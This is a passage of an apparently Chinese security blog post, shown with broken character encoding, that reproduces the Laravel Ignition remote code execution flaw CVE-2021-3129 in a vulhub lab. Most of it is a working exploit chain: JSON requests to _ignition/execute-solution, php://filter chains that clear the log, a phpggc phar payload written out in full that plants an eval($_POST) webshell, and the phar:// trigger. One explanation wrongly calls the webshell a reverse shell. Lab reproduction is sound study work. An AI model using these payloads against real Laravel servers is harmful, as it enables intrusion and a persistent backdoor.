 github-cloud.s3.amazonaws.com<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><img src="/2024/12/31/lou-dong-zhi-shi-ku/laravel-rce-cve-2021-3129/%E6%88%AA%E5%B1%8F2024-12-31%2016.56.35.png" style="zoom:50%;"><img src="/2024/12/31/lou-dong-zhi-shi-ku/laravel-rce-cve-2021-3129/%E6%88%AA%E5%B1%8F2024-12-31%2016.57.02.png" style="zoom:50%;"><p>github.comå¯ä»¥pingé€šäº†ã€‚</p><p>ä½†æ˜¯ä»ç„¶æ— æ³•git cloneã€‚</p><p>rebootä¹‹åé‡è¯•ï¼š</p><img src="/2024/12/31/lou-dong-zhi-shi-ku/laravel-rce-cve-2021-3129/%E6%88%AA%E5%B1%8F2024-12-31%2017.01.54.png" style="zoom:40%;"><p>fatal: unable to access â€˜<a href="https://github.com/vulhub/vulhub.git/">https://github.com/vulhub/vulhub.git/</a>â€˜: Encountered end of file</p><p>å°†httpsæ”¹æˆhttpä¹‹åå±…ç„¶å¯ä»¥äº†ã€‚</p><img src="/2024/12/31/lou-dong-zhi-shi-ku/laravel-rce-cve-2021-3129/%E6%88%AA%E5%B1%8F2024-12-31%2017.03.25.png" style="zoom:40%;"></blockquote><p>å…‹éš†å®Œæˆåä¸€çº§ç›®å½•å†…çš„å†…å®¹å¦‚ä¸‹ï¼š</p><img src="/2024/12/31/lou-dong-zhi-shi-ku/laravel-rce-cve-2021-3129/%E6%88%AA%E5%B1%8F2024-12-31%2017.14.53.png" alt="vulhubä¸€çº§ç›®å½•" style="zoom:50%;"><h3 id="2-1-2-å¯åŠ¨Laravel"><a href="#2-1-2-å¯åŠ¨Laravel" class="headerlink" title="2.1.2 å¯åŠ¨Laravel"></a>2.1.2 å¯åŠ¨Laravel</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> laravel/CVE-2021-3129/<span class="token function">docker</span> compose up <span class="token parameter variable">-d</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><blockquote><p>å¤§æˆ˜bugï¼š</p><img src="/2024/12/31/lou-dong-zhi-shi-ku/laravel-rce-cve-2021-3129/%E6%88%AA%E5%B1%8F2024-12-31%2017.19.33.png" style="zoom:50%;"><p>åˆ†æå¯èƒ½æ˜¯rebooté‡å¯ä¹‹åï¼Œæ²¡æœ‰å¯åŠ¨dockeræœåŠ¡ã€‚</p><img src="/2024/12/31/lou-dong-zhi-shi-ku/laravel-rce-cve-2021-3129/%E6%88%AA%E5%B1%8F2024-12-31%2017.20.46.png" style="zoom:50%;"></blockquote><p>é‡æ–°æ‰§è¡Œ<code>docker compose up -d</code></p><img src="/2024/12/31/lou-dong-zhi-shi-ku/laravel-rce-cve-2021-3129/%E6%88%AA%E5%B1%8F2024-12-31%2017.21.43.png" style="zoom:50%;"><p>æŸ¥çœ‹å®¹å™¨è¿è¡ŒçŠ¶æ€</p><img src="/2024/12/31/lou-dong-zhi-shi-ku/laravel-rce-cve-2021-3129/%E6%88%AA%E5%B1%8F2024-12-31%2017.26.05.png" style="zoom:50%;"><p>è®¿é—®æµ‹è¯•ï¼š</p><img src="/2024/12/31/lou-dong-zhi-shi-ku/laravel-rce-cve-2021-3129/%E6%88%AA%E5%B1%8F2024-12-31%2017.27.21.png" style="zoom:30%;"><h2 id="2-2-æ¼æ´å¤ç°"><a href="#2-2-æ¼æ´å¤ç°" class="headerlink" title="2.2 æ¼æ´å¤ç°"></a>2.2 æ¼æ´å¤ç°</h2><h3 id="2-2-1-æ¼æ´å­˜åœ¨æ€§åˆ¤åˆ«"><a href="#2-2-1-æ¼æ´å­˜åœ¨æ€§åˆ¤åˆ«" class="headerlink" title="2.2.1 æ¼æ´å­˜åœ¨æ€§åˆ¤åˆ«"></a>2.2.1 æ¼æ´å­˜åœ¨æ€§åˆ¤åˆ«</h3><p>Laravelç¯å¢ƒæ­å»ºå®Œæˆåï¼Œç¬¬ä¸€æ¬¡è®¿é—®é¦–é¡µï¼Œä¼šå‡ºç°æŠ¥é”™â€œNo application encryption key has been specified.â€ï¼ˆæœªæŒ‡å®šåº”ç”¨åŠ å¯†å¯†é’¥ï¼‰ã€‚å…¶åœ¨ä¸‹æ–¹ç»™æˆ‘ä»¬æä¾›äº†ä¸€ä¸ªä¿®å¤æ–¹æ¡ˆï¼ˆIgnition ç»„ä»¶æä¾›ï¼‰ã€‚ç‚¹å‡»é¡µé¢ä¸­çš„â€œGenerate app keyâ€ï¼Œä¼šç”Ÿæˆå¯¹åº”åº”ç”¨å¯†é’¥ï¼Œè¿™é‡Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨Brup Suiteæ‹¦æˆªè¯¥è¯·æ±‚ã€‚</p><img src="/2024/12/31/lou-dong-zhi-shi-ku/laravel-rce-cve-2021-3129/%E6%88%AA%E5%B1%8F2025-01-02%2013.41.28.png" style="zoom:40%;"><p>ç„¶åä¿®æ”¹è¯·æ±‚æ­£æ–‡ä¸­çš„ solution å‚æ•°ä¿®æ”¹ä¸º MakeViewVariableOptionalSolution ï¼Œå¦‚ä¸‹ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">{</span>    <span class="token string">"solution"</span><span class="token builtin class-name">:</span> <span class="token string">"Facade<span class="token entity" title="\\">\\</span>Ignition<span class="token entity" title="\\">\\</span>Solutions<span class="token entity" title="\\">\\</span>MakeViewVariableOptionalSolution"</span>,    <span class="token string">"parameters"</span><span class="token builtin class-name">:</span> <span class="token punctuation">{</span>        <span class="token string">"variableName"</span><span class="token builtin class-name">:</span> <span class="token string">"asabcde"</span>,        <span class="token string">"viewFile"</span><span class="token builtin class-name">:</span> <span class="token string">"xx1111111xx"</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å‘é€ä¿®æ”¹åçš„è¯·æ±‚ï¼Œè‹¥è¿”å›500ï¼Œä¸”æç¤ºfile_get_contents()çš„æŠ¥é”™æ—¶ï¼Œåˆ™æœ‰æ­¤æ¼æ´ã€‚</p><img src="/2024/12/31/lou-dong-zhi-shi-ku/laravel-rce-cve-2021-3129/%E6%88%AA%E5%B1%8F2025-01-02%2013.43.04.png" style="zoom:40%;"><h3 id="2-2-2-step1-æ¸…ç©ºlaravelæ—¥å¿—"><a href="#2-2-2-step1-æ¸…ç©ºlaravelæ—¥å¿—" class="headerlink" title="2.2.2 step1:æ¸…ç©ºlaravelæ—¥å¿—"></a>2.2.2 step1:æ¸…ç©ºlaravelæ—¥å¿—</h3><p>æ‰§è¡Œè¿‡ä¸Šè¿°æ¼æ´å­˜åœ¨æ€§åˆ¤åˆ«ä¹‹åï¼Œlaravel.logä¸­ä¼šè®°å½•æ—¥å¿—ï¼Œå¯ä»¥ä»è·¯å¾„/var/www/storage/logs/laravel.logä¸­çœ‹åˆ°ã€‚</p><img src="/2024/12/31/lou-dong-zhi-shi-ku/laravel-rce-cve-2021-3129/%E6%88%AA%E5%B1%8F2025-01-02%2013.49.59.png" style="zoom:40%;"><img src="/2024/12/31/lou-dong-zhi-shi-ku/laravel-rce-cve-2021-3129/%E6%88%AA%E5%B1%8F2025-01-02%2013.51.52.png" style="zoom:40%;"><p>è®¿é—®/_ignition/execute-solutionï¼Œä½¿ç”¨Brupæ‹¦æˆªè¯·æ±‚ï¼Œä¿®æ”¹è¯·æ±‚æ–¹æ³•ä¸ºPOSTï¼Œä¿®æ”¹Content-Typeä¸º application/jsonï¼Œæ·»åŠ å¦‚ä¸‹è¯·æ±‚æ­£æ–‡ï¼Œå‘é€è¯·æ±‚ï¼Œæ¸…ç©ºlaravelæ—¥å¿—ã€‚</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span> <span class="token property">"solution"</span><span class="token operator">:</span> <span class="token string">"Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution"</span><span class="token punctuation">,</span> <span class="token property">"parameters"</span><span class="token operator">:</span> <span class="token punctuation">{</span> <span class="token property">"variableName"</span><span class="token operator">:</span> <span class="token string">"xxxxx"</span><span class="token punctuation">,</span> <span class="token property">"viewFile"</span><span class="token operator">:</span> <span class="token string">"php://filter/write=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log"</span> <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="/2024/12/31/lou-dong-zhi-shi-ku/laravel-rce-cve-2021-3129/%E6%88%AA%E5%B1%8F2025-01-02%2013.54.20.png" style="zoom:67%;"><img src="/2024/12/31/lou-dong-zhi-shi-ku/laravel-rce-cve-2021-3129/%E6%88%AA%E5%B1%8F2025-01-02%2013.55.04.png" style="zoom:50%;"><p>å¯ä»¥çœ‹åˆ°æ—¥å¿—å·²ç»è¢«æ¸…ç©ºäº†ã€‚åˆ©ç”¨çš„åŸç†æ˜¯php://filter ä¸­çš„ convert.base64-decode è¿‡æ»¤å™¨çš„ç‰¹æ€§ï¼Œconvert.base64-decodeè¿‡æ»¤å™¨ä¼šå°†ä¸€äº›ébase64å­—ç¬¦ç»™è¿‡æ»¤æ‰åå†è¿›è¡Œbase64è§£ç ï¼Œäºæ˜¯æˆ‘ä»¬å¯ä»¥å°†æ—¥å¿—æ–‡ä»¶ä¸­çš„æ‰€æœ‰å†…å®¹è½¬æ¢æˆébase64ç¼–ç å‡ºç°çš„å­—ç¬¦ï¼Œç„¶åå†ä½¿ç”¨ convert.base64-decode è¿‡æ»¤å™¨è¯»å–ï¼Œæ­¤æ—¶è¯»å–åˆ°çš„å†…å®¹å°±ä¸ºç©ºï¼Œæœ€ç»ˆè¾¾åˆ°æ¸…ç©ºæ—¥å¿—æ–‡ä»¶çš„ç›®çš„ã€‚</p><h3 id="2-2-3-step2-åŸºäºphpggcç”Ÿæˆpayload"><a href="#2-2-3-step2-åŸºäºphpggcç”Ÿæˆpayload" class="headerlink" title="2.2.3 step2:åŸºäºphpggcç”Ÿæˆpayload"></a>2.2.3 step2:åŸºäºphpggcç”Ÿæˆpayload</h3><p>ç”¨phpggcæŒ‡å®šåˆ©ç”¨é“¾ä¸ºLaravel/RCE5ç”Ÿæˆååºåˆ—åŒ–åˆ©ç”¨çš„POCï¼Œæ­¤å¤„ä¸ºå†™å…¥ä¸€å¥è¯æœ¨é©¬åˆ°shell.phpä¸­ã€‚</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">// å°†ä¸€å¥è¯æœ¨é©¬ <span class="token operator">&lt;</span>?php  eval<span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span>a<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>?<span class="token operator">&gt;</span> base64ç¼–ç PD9waHAgIGV2YWwoJF9QT1NUW2FdKTs/Pg<span class="token operator">==</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">php <span class="token parameter variable">-d</span> <span class="token string">"phar.readonly=0"</span> ./phpggc Laravel/RCE5 <span class="token string">"system('echo PD9waHAgIGV2YWwoJF9QT1NUW2FdKTs/Pg==|base64 -d &gt; /var/www/html/shell.php');"</span> <span class="token parameter variable">--phar</span> phar <span class="token parameter variable">-o</span> php://output <span class="token operator">|</span> base64 <span class="token parameter variable">-w</span> <span class="token number">0</span> <span class="token operator">|</span> python <span class="token parameter variable">-c</span> <span class="token string">"import sys;print(''.join(['=' + hex(ord(i))[2:] + '=00' for i in sys.stdin.read()]).upper())"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>è¯¦è§£ï¼š</p><ol><li><code>php -d "phar.readonly=0"</code>ï¼š<ul><li>è¿™ä¸ªéƒ¨åˆ†æ˜¯å¯åŠ¨PHP CLIæ—¶çš„ä¸€ä¸ªé…ç½®é€‰é¡¹ï¼Œ<code>phar.readonly=0</code> å…è®¸ä¿®æ”¹PHARæ–‡ä»¶ã€‚PHARæ–‡ä»¶æ˜¯PHPå½’æ¡£æ–‡ä»¶ï¼Œå¯ä»¥åŒ…å«PHPè„šæœ¬å’Œæ•°æ®ã€‚</li></ul></li><li><code>./phpggc Laravel/RCE5</code>ï¼š<ul><li>è¿™æ˜¯è°ƒç”¨PHPGGCå·¥å…·çš„å‘½ä»¤ï¼Œ<code>Laravel/RCE5</code> æŒ‡çš„æ˜¯Laravelæ¡†æ¶ä¸­çš„ä¸€ä¸ªç‰¹å®šçš„ååºåˆ—åŒ–æ¼æ´ï¼ˆRCEï¼Œè¿œç¨‹ä»£ç æ‰§è¡Œï¼‰ã€‚</li></ul></li><li><code>"system('echo PD9waHAgIGV2YWwoJF9QT1NUW2FdKTs/Pg==|base64 -d &gt; /var/www/html/shell.php');"</code>ï¼š<ul><li>è¿™æ˜¯ä¸€ä¸ªç³»ç»Ÿå‘½ä»¤ï¼Œç”¨äºåœ¨ç›®æ ‡æœåŠ¡å™¨ä¸Šæ‰§è¡Œã€‚å®ƒé¦–å…ˆå°†base64ç¼–ç çš„å­—ç¬¦ä¸²è§£ç å¹¶é‡å®šå‘è¾“å‡ºåˆ°<code>/var/www/html/shell.php</code>æ–‡ä»¶ä¸­ã€‚è¿™ä¸ªbase64å­—ç¬¦ä¸²è§£ç åæ˜¯ä¸€ä¸ªPHPä»£ç ï¼Œç”¨äºåˆ›å»ºä¸€ä¸ªåå‘shellã€‚</li></ul></li><li><code>--phar phar</code>ï¼š<ul><li>è¿™ä¸ªé€‰é¡¹å‘Šè¯‰PHPGGCç”Ÿæˆä¸€ä¸ªPHARæ–‡ä»¶ã€‚</li></ul></li><li><code>-o php://output</code>ï¼š<ul><li>è¿™ä¸ªé€‰é¡¹å°†å‘½ä»¤çš„è¾“å‡ºå‘é€åˆ°PHPçš„è¾“å‡ºæµã€‚</li></ul></li><li><code>| base64 -w 0</code>ï¼š<ul><li>è¿™ä¸ªç®¡é“å‘½ä»¤å°†PHPGGCçš„è¾“å‡ºè¿›è¡Œbase64ç¼–ç ï¼Œ<code>-w 0</code> å‚æ•°è¡¨ç¤ºä¸æ¢è¡Œã€‚</li></ul></li><li><code>| python -c "import sys;print(''.join(['=' + hex(ord(i))[2:] + '=00' for i in sys.stdin.read()]).upper())"</code>ï¼š<ul><li>è¿™ä¸ªç®¡é“å‘½ä»¤ä½¿ç”¨Pythonå°†base64ç¼–ç çš„æ•°æ®è½¬æ¢ä¸ºä¸€ä¸ªURLå®‰å…¨çš„base64ç¼–ç å­—ç¬¦ä¸²ï¼Œå¹¶ä¸”æ¯ä¸ªå­—èŠ‚åé¢éƒ½æ·»åŠ äº†<code>=00</code>ï¼Œè¿™æ˜¯ä¸€ç§å¸¸è§çš„ç¼–ç æŠ€å·§ï¼Œç”¨äºç»•è¿‡æŸäº›å®‰å…¨æœºåˆ¶ã€‚</li></ul></li></ol><p>è¿™ä¸ªå‘½ä»¤çš„æœ€ç»ˆç›®çš„æ˜¯ç”Ÿæˆä¸€ä¸ªç»è¿‡ç‰¹æ®Šç¼–ç çš„PHARæ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶åœ¨è¢«ç›®æ ‡æœåŠ¡å™¨ååºåˆ—åŒ–æ—¶ï¼Œä¼šæ‰§è¡Œä¸€ä¸ªç³»ç»Ÿå‘½ä»¤ï¼Œåˆ›å»ºä¸€ä¸ªåå‘shellã€‚</p></blockquote><img src="/2024/12/31/lou-dong-zhi-shi-ku/laravel-rce-cve-2021-3129/%E6%88%AA%E5%B1%8F2025-01-02%2014.00.24.png" style="zoom:50%;"><h3 id="2-2-4-step3-å‘é€æ— å®³payload"><a href="#2-2-4-step3-å‘é€æ— å®³payload" class="headerlink" title="2.2.4 step3:å‘é€æ— å®³payload"></a>2.2.4 step3:å‘é€æ— å®³payload</h3><p>å‘é€AAç”Ÿæˆæ— å®³paylaodï¼Œè¿›è¡Œæ–¹ä¾¿åç»­è¡¥é½ã€‚</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span> <span class="token property">"solution"</span><span class="token operator">:</span> <span class="token string">"Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution"</span><span class="token punctuation">,</span> <span class="token property">"parameters"</span><span class="token operator">:</span> <span class="token punctuation">{</span> <span class="token property">"variableName"</span><span class="token operator">:</span> <span class="token string">"xxxxx"</span><span class="token punctuation">,</span> <span class="token property">"viewFile"</span><span class="token operator">:</span> <span class="token string">"AA"</span> <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-2-5-step4-å‘é€payload"><a href="#2-2-5-step4-å‘é€payload" class="headerlink" title="2.2.5 step4:å‘é€payload"></a>2.2.5 step4:å‘é€payload</h3><p>å‘é€POCè‡³æœåŠ¡å™¨ï¼Œæ³¨æ„è¦åœ¨viewFileçš„æœ€åæ·»åŠ ä¸€ä¸ªå­—æ¯aã€‚</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span> <span class="token property">"solution"</span><span class="token operator">:</span> <span class="token string">"Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution"</span><span class="token punctuation">,</span> <span class="token property">"parameters"</span><span class="token operator">:</span> <span class="token punctuation">{</span> <span class="token property">"variableName"</span><span class="token operator">:</span> <span class="token string">"xxxxx"</span><span class="token punctuation">,</span> <span class="token property">"viewFile"</span><span class="token operator">:</span> <span class="token string">"=50=00=44=00=39=00=77=00=61=00=48=00=41=00=67=00=58=00=31=00=39=00=49=00=51=00=55=00=78=00=55=00=58=00=30=00=4E=00=50=00=54=00=56=00=42=00=4A=00=54=00=45=00=56=00=53=00=4B=00=43=00=6B=00=37=00=49=00=44=00=38=00=2B=00=44=00=51=00=70=00=4E=00=41=00=67=00=41=00=41=00=41=00=51=00=41=00=41=00=41=00=42=00=45=00=41=00=41=00=41=00=41=00=42=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=58=00=41=00=67=00=41=00=41=00=54=00=7A=00=6F=00=30=00=4D=00=44=00=6F=00=69=00=53=00=57=00=78=00=73=00=64=00=57=00=31=00=70=00=62=00=6D=00=46=00=30=00=5A=00=56=00=78=00=43=00=63=00=6D=00=39=00=68=00=5A=00=47=00=4E=00=68=00=63=00=33=00=52=00=70=00=62=00=6D=00=64=00=63=00=55=00=47=00=56=00=75=00=5A=00=47=00=6C=00=75=00=5A=00=30=00=4A=00=79=00=62=00=32=00=46=00=6B=00=59=00=32=00=46=00=7A=00=64=00=43=00=49=00=36=00=4D=00=6A=00=70=00=37=00=63=00=7A=00=6F=00=35=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=6C=00=64=00=6D=00=56=00=75=00=64=00=48=00=4D=00=69=00=4F=00=30=00=38=00=36=00=4D=00=6A=00=55=00=36=00=49=00=6B=00=6C=00=73=00=62=00=48=00=56=00=74=00=61=00=57=00=35=00=68=00=64=00=47=00=56=00=63=00=51=00=6E=00=56=00=7A=00=58=00=45=00=52=00=70=00=63=00=33=00=42=00=68=00=64=00=47=00=4E=00=6F=00=5A=00=58=00=49=00=69=00=4F=00=6A=00=45=00=36=00=65=00=33=00=4D=00=36=00=4D=00=54=00=59=00=36=00=49=00=67=00=41=00=71=00=41=00=48=00=46=00=31=00=5A=00=58=00=56=00=6C=00=55=00=6D=00=56=00=7A=00=62=00=32=00=78=00=32=00=5A=00=58=00=49=00=69=00=4F=00=32=00=45=00=36=00=4D=00=6A=00=70=00=37=00=61=00=54=00=6F=00=77=00=4F=00=30=00=38=00=36=00=4D=00=6A=00=55=00=36=00=49=00=6B=00=31=00=76=00=59=00=32=00=74=00=6C=00=63=00=6E=00=6C=00=63=00=54=00=47=00=39=00=68=00=5A=00=47=00=56=00=79=00=58=00=45=00=56=00=32=00=59=00=57=00=78=00=4D=00=62=00=32=00=46=00=6B=00=5A=00=58=00=49=00=69=00=4F=00=6A=00=41=00=36=00=65=00=33=00=31=00=70=00=4F=00=6A=00=45=00=37=00=63=00=7A=00=6F=00=30=00=4F=00=69=00=4A=00=73=00=62=00=32=00=46=00=6B=00=49=00=6A=00=74=00=39=00=66=00=58=00=4D=00=36=00=4F=00=44=00=6F=00=69=00=41=00=43=00=6F=00=41=00=5A=00=58=00=5A=00=6C=00=62=00=6E=00=51=00=69=00=4F=00=30=00=38=00=36=00=4D=00=7A=00=67=00=36=00=49=00=6B=00=6C=00=73=00=62=00=48=00=56=00=74=00=61=00=57=00=35=00=68=00=64=00=47=00=56=00=63=00=51=00=6E=00=4A=00=76=00=59=00=57=00=52=00=6A=00=59=00=58=00=4E=00=30=00=61=00=57=00=35=00=6E=00=58=00=45=00=4A=00=79=00=62=00=32=00=46=00=6B=00=59=00=32=00=46=00=7A=00=64=00=45=00=56=00=32=00=5A=00=57=00=35=00=30=00=49=00=6A=00=6F=00=78=00=4F=00=6E=00=74=00=7A=00=4F=00=6A=00=45=00=77=00=4F=00=69=00=4A=00=6A=00=62=00=32=00=35=00=75=00=5A=00=57=00=4E=00=30=00=61=00=57=00=39=00=75=00=49=00=6A=00=74=00=50=00=4F=00=6A=00=4D=00=79=00=4F=00=69=00=4A=00=4E=00=62=00=32=00=4E=00=72=00=5A=00=58=00=4A=00=35=00=58=00=45=00=64=00=6C=00=62=00=6D=00=56=00=79=00=59=00=58=00=52=00=76=00=63=00=6C=00=78=00=4E=00=62=00=32=00=4E=00=72=00=52=00=47=00=56=00=6D=00=61=00=57=00=35=00=70=00=64=00=47=00=6C=00=76=00=62=00=69=00=49=00=36=00=4D=00=6A=00=70=00=37=00=63=00=7A=00=6F=00=35=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=6A=00=62=00=32=00=35=00=6D=00=61=00=57=00=63=00=69=00=4F=00=30=00=38=00=36=00=4D=00=7A=00=55=00=36=00=49=00=6B=00=31=00=76=00=59=00=32=00=74=00=6C=00=63=00=6E=00=6C=00=63=00=52=00=32=00=56=00=75=00=5A=00=58=00=4A=00=68=00=64=00=47=00=39=00=79=00=58=00=45=00=31=00=76=00=59=00=32=00=74=00=44=00=62=00=32=00=35=00=6D=00=61=00=57=00=64=00=31=00=63=00=6D=00=46=00=30=00=61=00=57=00=39=00=75=00=49=00=6A=00=6F=00=78=00=4F=00=6E=00=74=00=7A=00=4F=00=6A=00=63=00=36=00=49=00=67=00=41=00=71=00=41=00=47=00=35=00=68=00=62=00=57=00=55=00=69=00=4F=00=33=00=4D=00=36=00=4E=00=7A=00=6F=00=69=00=59=00=57=00=4A=00=6A=00=5A=00=47=00=56=00=6D=00=5A=00=79=00=49=00=37=00=66=00=58=00=4D=00=36=00=4E=00=7A=00=6F=00=69=00=41=00=43=00=6F=00=41=00=59=00=32=00=39=00=6B=00=5A=00=53=00=49=00=37=00=63=00=7A=00=6F=00=78=00=4D=00=44=00=4D=00=36=00=49=00=6A=00=77=00=2F=00=63=00=47=00=68=00=77=00=49=00=48=00=4E=00=35=00=63=00=33=00=52=00=6C=00=62=00=53=00=67=00=6E=00=5A=00=57=00=4E=00=6F=00=62=00=79=00=42=00=51=00=52=00=44=00=6C=00=33=00=59=00=55=00=68=00=42=00=5A=00=30=00=6C=00=48=00=56=00=6A=00=4A=00=5A=00=56=00=33=00=64=00=76=00=53=00=6B=00=59=00=35=00=55=00=56=00=51=00=78=00=54=00=6C=00=56=00=58=00=4D=00=6B=00=5A=00=6B=00=53=00=31=00=52=00=7A=00=4C=00=31=00=42=00=6E=00=50=00=54=00=31=00=38=00=59=00=6D=00=46=00=7A=00=5A=00=54=00=59=00=30=00=49=00=43=00=31=00=6B=00=49=00=44=00=34=00=67=00=4C=00=33=00=5A=00=68=00=63=00=69=00=39=00=33=00=64=00=33=00=63=00=76=00=61=00=48=00=52=00=74=00=62=00=43=00=39=00=7A=00=61=00=47=00=56=00=73=00=62=00=43=00=35=00=77=00=61=00=48=00=41=00=6E=00=4B=00=54=00=73=00=67=00=5A=00=58=00=68=00=70=00=64=00=44=00=73=00=67=00=50=00=7A=00=34=00=69=00=4F=00=33=00=31=00=39=00=66=00=51=00=67=00=41=00=41=00=41=00=42=00=30=00=5A=00=58=00=4E=00=30=00=4C=00=6E=00=52=00=34=00=64=00=41=00=51=00=41=00=41=00=41=00=44=00=47=00=4B=00=44=00=68=00=6B=00=42=00=41=00=41=00=41=00=41=00=41=00=78=00=2B=00=66=00=39=00=69=00=6B=00=41=00=51=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=48=00=52=00=6C=00=63=00=33=00=51=00=62=00=64=00=32=00=6A=00=61=00=74=00=58=00=77=00=4A=00=4D=00=56=00=57=00=73=00=52=00=6A=00=50=00=58=00=4A=00=5A=00=52=00=48=00=50=00=37=00=4B=00=76=00=5A=00=51=00=49=00=41=00=41=00=41=00=42=00=48=00=51=00=6B=00=31=00=43=00a"</span> <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="/2024/12/31/lou-dong-zhi-shi-ku/laravel-rce-cve-2021-3129/%E6%88%AA%E5%B1%8F2025-01-02%2014.06.38.png" style="zoom:50%;"><h3 id="2-2-6-step5-å°†æ—¥å¿—æ–‡ä»¶æ„é€ æˆphar"><a href="#2-2-6-step5-å°†æ—¥å¿—æ–‡ä»¶æ„é€ æˆphar" class="headerlink" title="2.2.6 step5:å°†æ—¥å¿—æ–‡ä»¶æ„é€ æˆphar"></a>2.2.6 step5:å°†æ—¥å¿—æ–‡ä»¶æ„é€ æˆphar</h3><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span> <span class="token property">"solution"</span><span class="token operator">:</span> <span class="token string">"Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution"</span><span class="token punctuation">,</span> <span class="token property">"parameters"</span><span class="token operator">:</span> <span class="token punctuation">{</span> <span class="token property">"variableName"</span><span class="token operator">:</span> <span class="token string">"xxxxx"</span><span class="token punctuation">,</span> <span class="token property">"viewFile"</span><span class="token operator">:</span> <span class="token string">"php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log"</span> <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="/2024/12/31/lou-dong-zhi-shi-ku/laravel-rce-cve-2021-3129/%E6%88%AA%E5%B1%8F2025-01-02%2014.09.28.png" style="zoom:50%;"><h3 id="2-2-7-step6-è§¦å‘å‘åºåˆ—åŒ–"><a href="#2-2-7-step6-è§¦å‘å‘åºåˆ—åŒ–" class="headerlink" title="2.2.7 step6:è§¦å‘å‘åºåˆ—åŒ–"></a>2.2.7 step6:è§¦å‘å‘åºåˆ—åŒ–</h3><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span> <span class="token property">"solution"</span><span class="token operator">:</span> <span class="token string">"Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution"</span><span class="token punctuation">,</span> <span class="token property">"parameters"</span><span class="token operator">:</span> <span class="token punctuation">{</span> <span class="token property">"variableName"</span><span class="token operator">:</span> <span class="token string">"xxxxx"</span><span class="token punctuation">,</span> <span class="token property">"viewFile"</span><span class="token operator">:</span> <span class="token string">"phar://../storage/logs/laravel.log/test.txt"</span> <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="/2024/12/31/lou-dong-zhi-shi-ku/laravel-rce-cve-2021-3129/%E6%88%AA%E5%B1%8F2025-01-02%2014.11.33.png" style="zoom:50%;"><img src="/2024/12/31/lou-dong-zhi-shi-ku/laravel-rce-cve-2021-3129/%E6%88%AA%E5%B1%8F2025-01-02%2014.12.28.png" style="zoom:40%;"><p>æˆåŠŸå†™å…¥æœ¨é©¬ã€‚</p><h3 id="2-2-8-step7-getshell"><a href="#2-2-8-step7-getshell" class="headerlink" title="2.2.8 step7:getshell"></a>2.2.8 step7:getshell</h3><p>åé—¨çš„åœ°å€å’Œå¯†ç å¦‚ä¸‹ï¼š</p><img src="/2024/12/31/lou-dong-zhi-shi-ku/laravel-rce-cve-2021-3129/%E6%88%AA%E5%B1%8F2025-01-02%2014.14.51.png" style="zoom:50%;"><img src="/2024/12/31/lou-dong-zhi-shi-ku/laravel-rce-cve-2021-3129/%E6%88%AA%E5%B1%8F2025-01-02%2014.14.15.png" style="zoom:50%;"><p>è‡³æ­¤ï¼ŒæˆåŠŸé€šè¿‡RCE getshellï¼</p><h1 id="ä¸‰ã€ä»£ç å®¡è®¡-æ¼æ´åˆ†æ"><a href="#ä¸‰ã€ä»£ç å®¡è®¡-æ¼æ´åˆ†æ" class="headerlink" title="ä¸‰ã€ä»£ç å®¡è®¡-æ¼æ´åˆ†æ"></a>ä¸‰ã€ä»£ç å®¡è®¡-æ¼æ´åˆ†æ</h1><h2 id="3-1-ignitionç»„ä»¶çš„solutions"><a href="#3-1-ignitionç»„ä»¶çš„solutions" class="headerlink" title="3.1 ignitionç»„ä»¶çš„solutions"></a>3.1 ignitionç»„ä»¶çš„solutions</h2><p>Laravelåœ¨ç¬¬6ç‰ˆä¹‹åï¼Œdebugæ¨¡å¼ä½¿ç”¨äº†ignitionç»„ä»¶æ¥ç¾åŒ–å †æ 